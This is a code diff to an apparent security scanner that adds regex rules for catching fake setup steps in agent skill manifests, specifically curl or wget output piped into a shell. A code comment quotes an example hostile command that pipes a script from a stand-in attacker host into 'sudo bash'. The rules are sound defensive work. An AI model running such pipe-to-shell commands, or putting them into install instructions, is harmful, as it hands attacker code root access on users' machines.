@@ -2301,7 +2301,14 @@ PATTERNS = [
             "paste",
         ],
         "regex": [
+            # Fire on agent/skill-directed pipe-to-shell OR an insecure http://
+            # source piped to a shell. A project's own documented https install
+            # one-liner (ollama/deno/grype: `curl https://… | sudo sh`) is
+            # neither, so it stays clean; `curl http://evil.sh | sudo bash` hits
+            # the insecure-source arm. (Jul-11: reconciles the famous-README FP
+            # fix with the curl_pipe_bash regression gate.)
             r"(?i)\b(?:skills?|agents?|assistants?|claude|copilot|cursor|mcp)\b[\s\S]{0,200}?(?:curl|wget|iwr|invoke-webrequest)\s+[^\n|]{0,200}\|\s*(?:sudo\s+)?(?:bash|sh|zsh|python\d?)\b",
+            r"(?i)(?:curl|wget|iwr|invoke-webrequest)\s+[^\n|]*http://[^\n|]{0,200}\|\s*(?:sudo\s+)?(?:bash|sh|zsh|python\d?)\b",
         ],
         "description": "Detects fake prerequisite/setup steps in skill manifests that trick users into running malicious commands."
     },
